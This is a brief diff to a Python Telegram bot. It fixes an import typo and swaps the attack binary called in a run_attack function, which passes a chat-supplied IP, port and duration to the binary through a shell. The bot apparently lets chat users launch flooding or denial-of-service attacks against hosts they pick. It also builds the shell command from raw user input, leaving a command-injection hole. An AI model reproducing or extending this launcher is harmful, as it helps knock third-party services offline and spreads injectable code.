@@ -1,4 +1,4 @@
-jiimport asyncio
+import asyncio
 from telegram import Update
 from telegram.ext import Application, CommandHandler, CallbackContext
 import os
@@ -174,7 +174,7 @@ async def run_attack(chat_id, ip, port, time, context):
 
     try:
         process = await asyncio.create_subprocess_shell(
-            f"./attack {ip} {port} {time} 900",
+            f"./megoxer {ip} {port} {time} ",
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
